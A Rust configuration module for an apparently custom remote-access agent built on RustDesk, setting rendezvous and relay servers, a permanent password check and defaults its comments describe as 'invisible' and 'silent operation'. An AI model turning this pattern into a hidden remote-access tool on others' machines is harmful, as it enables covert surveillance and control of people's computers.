// ============================================================================
// Agent Configuration Module
// ============================================================================
// Manages the agent's persistent configuration stored in the RustDesk config
// directory. Handles first-run detection and server address configuration.

use hbb_common::config::Config;
use std::path::PathBuf;

/// Default rendezvous server address.
/// Change this to your own server IP before building.
pub const DEFAULT_RENDEZVOUS_SERVER: &str = "rs-ny.rustdesk.com";

/// Default relay server address.
/// Change this to your own server IP before building.
pub const DEFAULT_RELAY_SERVER: &str = "";

/// Check if the agent has been configured (i.e., not a first run).
pub fn is_configured() -> bool {
    // Check if config file exists and has an ID set
    let id = Config::get_id();
    if id.is_empty() {
        return false;
    }

    // Check if a permanent password has been set
    let password = Config::get_permanent_password();
    !password.is_empty()
}

/// Get the config directory path for the agent.
pub fn get_config_dir() -> PathBuf {
    if let Some(appdata) = std::env::var_os("APPDATA") {
        PathBuf::from(appdata).join("RustDesk").join("config")
    } else {
        PathBuf::from(".").join("config")
    }
}

/// Apply default server configuration if not already set.
pub fn apply_default_server_config() {
    let current = Config::get_option("custom-rendezvous-server");
    if current.is_empty() && !DEFAULT_RENDEZVOUS_SERVER.is_empty() {
        Config::set_option("custom-rendezvous-server".to_owned(), DEFAULT_RENDEZVOUS_SERVER.to_owned());
        hbb_common::log::info!("Set rendezvous server to: {}", DEFAULT_RENDEZVOUS_SERVER);
    }

    let current_relay = Config::get_option("relay-server");
    if current_relay.is_empty() && !DEFAULT_RELAY_SERVER.is_empty() {
        Config::set_option("relay-server".to_owned(), DEFAULT_RELAY_SERVER.to_owned());
        hbb_common::log::info!("Set relay server to: {}", DEFAULT_RELAY_SERVER);
    }
}

/// Disable all notifications and UI features for invisible operation.
pub fn apply_agent_defaults() {
    // Disable direct server (we only use rendezvous)
    // Config::set_option("direct-server".to_owned(), "N".to_owned());

    // Enable the service to allow incoming connections
    Config::set_option("stop-service".to_owned(), "".to_owned());

    // Disable auto-update (agent is managed separately)
    Config::set_option("enable-auto-update".to_owned(), "N".to_owned());

    hbb_common::log::info!("Agent defaults applied (silent operation mode)");
}
